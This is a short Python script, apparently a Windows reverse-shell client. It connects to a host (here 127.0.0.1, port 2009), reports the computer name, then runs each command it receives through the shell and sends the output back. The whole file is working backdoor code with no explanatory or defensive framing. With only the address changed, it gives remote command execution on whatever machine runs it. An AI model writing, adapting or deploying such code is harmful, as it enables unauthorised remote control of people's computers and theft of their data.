import socket
import subprocess

client = socket.socket()


client.connect(("127.0.0.1", 2009))


name = subprocess.check_output("Echo %computername%", shell=True)
client.send(name)

while True:
    cmd = client.recv(512).decode("cp866")


    out  = subprocess.check_output(cmd, shell=True)
    print(out)
    print(client.send(out))